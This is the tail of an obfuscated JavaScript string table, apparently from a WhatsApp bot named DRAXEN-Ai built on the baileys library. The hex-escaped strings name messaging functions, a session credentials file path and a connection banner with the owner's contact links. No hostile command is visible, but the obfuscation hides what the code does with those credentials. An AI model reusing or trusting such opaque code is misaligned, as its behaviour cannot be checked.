'\x37\x36\x31\x38\x31\x38\x30\x4b\x55\x52\x43\x78\x55', '\x66\x6f\x72\x45\x61\x63\x68', '\x73\x74\x69\x63\x6b\x65\x72\x4d\x65\x73\x73\x61\x67\x65', '\x2f\x73\x65\x73\x73\x69\x6f\x6e\x73\x2f\x63\x72\x65\x64\x73\x2e\x6a\x73\x6f\x6e', '\x0a\x46\x4e\x3a', '\x6f\x75\x74\x70\x75\x74', '\x73\x74\x72\x69\x6e\x67\x69\x66\x79', '\x65\x72\x72\x6f\x72', '\x74\x79\x70\x65', '\x66\x69\x6e\x64', '\x75\x70\x64\x61\x74\x65', '\x72\x65\x6c\x61\x79\x4d\x65\x73\x73\x61\x67\x65', '\x71\x72\x63\x6f\x64\x65\x2d\x74\x65\x72\x6d\x69\x6e\x61\x6c', '\ud83d\ude46\u200d\u2640\ufe0f', '\u26f9\ufe0f\u200d\u2640\ufe0f', '\ud83e\uddd7\u200d\u2642\ufe0f', '\ud83c\udfcc\ufe0f\u200d\u2642\ufe0f', '\ud83d\udc6f\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66', '\ud83e\uddd1\u200d\ud83c\udf73', '\x66\x72\x6f\x6d\x4d\x65', '\ud83d\udc73\u200d\u2642\ufe0f', '\x70\x61\x72\x73\x65', '\ud83d\udc69\u200d\ud83c\udf93', '\ud83d\udeb4\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83c\udf7c', '\x6d\x74\x79\x70\x65', '\x6a\x6f\x69\x6e', '\x38\x30\x30\x38\x34\x33\x34\x72\x63\x47\x71\x66\x62', '\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\x20\x0a\u2503\x44\x52\x41\x58\x45\x4e\x2d\x41\x69\x0a\u2503\ud835\udc12\ud835\udc04\ud835\udc12\ud835\udc12\ud835\udc08\ud835\udc0e\ud835\udc0d\x20\ud835\udc08\ud835\udc12\x0a\u2503\ud835\udc12\ud835\udc14\ud835\udc02\ud835\udc02\ud835\udc04\ud835\udc12\ud835\udc12\ud835\udc05\ud835\udc14\ud835\udc0b\ud835\udc0b\ud835\udc18\x20\x0a\u2503\ud835\udc02\ud835\udc0e\ud835\udc0d\ud835\udc0d\ud835\udc04\ud835\udc02\ud835\udc13\ud835\udc04\ud835\udc03\x20\u2705\ud83d\udd25\x0a\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\x20\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x20\u2605\x20\x7c\x7c\x20\u1d04\u0280\u1d07\u1d00\u1d1b\u1d0f\u0280\x20\x3d\x20\ud81a\udd58\u26a1\x20\x44\x52\x41\x58\x45\x4e\u2022\u2022\u2022\u00b2\u2074\u2070\u00b2\x20\u26a1\ud81a\udd58\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x20\u2605\x20\x7c\x7c\x20\u1d0f\u1d21\u0274\u1d07\u0280\x20\x3d\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x61\x2e\x6d\x65\x2f\x32\x35\x35\x37\x31\x36\x39\x34\x35\x39\x37\x32\x20\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x20\u2605\x20\x7c\x7c\x20\u1d21\u029c\u1d00\u1d1b\x73\u1d00\u1d18\u1d18\x20\x3d\x20\x30\x30\x32\x39\x56\x62\x34\x76\x62\x4b\x46\x36\x78\x43\x53\x4d\x45\x46\x6f\x70\x78\x63\x31\x30\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x20\u2605\x20\x7c\x7c\x20\u0299\u1d0f\u1d1b\x20\u0280\u1d07\u1d18\u1d0f\x20\x3d\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x64\x75\x6c\x6c\x61\x72\x32\x35\x35\x2f\x44\x52\x41\x58\x45\x4e\x2d\x41\x69\x20\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x20\u2605\x20\x7c\x7c\x20\u028f\u1d0f\u1d1c\u1d1b\u1d1c\u0299\u1d07\x20\x3d\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x61\x62\x64\x61\x6c\x6c\x61\x68\x73\x61\x6c\x69\x6d\x2d\x66\x35\x75\x3f\x73\x69\x3d\x50\x50\x79\x51\x79\x32\x71\x6f\x67\x69\x58\x41\x2d\x50\x43\x47\x20\x20\x0a\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\u25ac\x0a\x3e\x20\u00a9\x20\u1d18\u1d0f\u1d21\u1d07\u0280\u1d07\u1d05\x20\u0299\u028f\x20\x44\x52\x41\x58\x45\x4e\x20\x41\x69\x20\ud83e\udd0e\x20', '\ud83d\udc69\u200d\ud83d\udcbb', '\x62\x61\x73\x65\x36\x34', '\ud83d\udd78\ufe0f', '\x65\x6d\x61\x69\x6c', '\x65\x6e\x64\x73\x57\x69\x74\x68', '\x61\x73\x53\x74\x69\x63\x6b\x65\x72', '\x32\x36\x38\x37\x31\x35\x37\x76\x4e\x66\x56\x79\x47', '\ud83e\udddc\u200d\u2642\ufe0f', '\ud83d\udc68\u200d\ud83e\uddb0', '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66', '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66', '\ud83c\udde8\ud83c\udde6', '\x74\x65\x78\x74', '\x0a\x69\x74\x65\x6d\x31\x2e\x58\x2d\x41\x42\x4c\x61\x62\x65\x6c\x3a\x43\x6c\x69\x63\x6b\x20\x68\x65\x72\x65\x20\x74\x6f\x20\x63\x68\x61\x74\x0a\x69\x74\x65\x6d\x32\x2e\x45\x4d\x41\x49\x4c\x3b\x74\x79\x70\x65\x3d\x49\x4e\x54\x45\x52\x4e\x45\x54\x3a', '\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x41\x6e\x64\x53\x61\x76\x65\x4d\x65\x64\x69\x61\x4d\x65\x73\x73\x61\x67\x65', '\ud83e\uddec\x20\x49\x6e\x73\x74\x61\x6c\x6c\x69\x6e\x67\x20\x50\x6c\x75\x67\x69\x6e\x73', '\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f', '\ud83d\ude45\u200d\u2642\ufe0f', '\ud83c\udfcc\ufe0f\u200d\u2640\ufe0f', '\ud83d\udc81\u200d\u2642\ufe0f', '\ud83d\udc08\u200d\u2b1b', '\ud83d\udc68\u200d\u2695\ufe0f', '\x2f\x73\x65\x73\x73\x69\x6f\x6e\x73\x2f', '\x75\x73\x65\x72', '\ud83e\udddd\u200d\u2642\ufe0f', '\x66\x69\x6c\x65\x2d\x74\x79\x70\x65', '\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65', '\x66\x75\x6e\x63\x74\x69\x6f\x6e', '\x41\x55\x54\x4f\x5f\x52\x45\x41\x43\x54', '\ud83c\uddfa\ud83c\uddf8', '\ud83d\ude4d\u200d\u2642\ufe0f', '\ud83d\udd73\ufe0f', '\ud83e\uddd1\u200d\ud83e\uddb3', '\ud83e\uddce\u200d\u2640\ufe0f', '\x73\x74\x72\x69\x6e\x67', '\ud83d\udde8\ufe0f', '\ud83d\udc68\u200d\ud83d\ude80', '\x6c\x6f\x67\x67\x65\x64\x4f\x75\x74', '\x63\x6f\x6e\x76\x65\x72\x73\x61\x74\x69\x6f\x6e', '\ud83e\uddd1\u200d\ud83e\uddb1', '\x6b\x65\x79', '\ud83d\ude47\u200d\u2642\ufe0f', '\ud83d\udd77\ufe0f', '\x40\x62\x72\x6f\x61\x64\x63\x61\x73\x74', '\x71\x75\x65\x72\x79', '\x40\x77\x68\x69\x73\x6b\x65\x79\x73\x6f\x63\x6b\x65\x74\x73\x2f\x62\x61\x69\x6c\x65\x79\x73', '\ud83e\uddd1\u200d\ud83e\uddaf', '\x74\x6f\x53\x74\x72\x69\x6e\x67', '\u26f9\ufe0f\u200d\u2642\ufe0f', '\ud83e\uddde\u200d\u2640\ufe0f', '\x73\x65\x74\x53\x74\x61\x74\x75\x73', '\ud83e\udddf\u200d\u2640\ufe0f'];
    _0x8d4a = function() {
        return _0x4778af;
    };
    return _0x8d4a();
}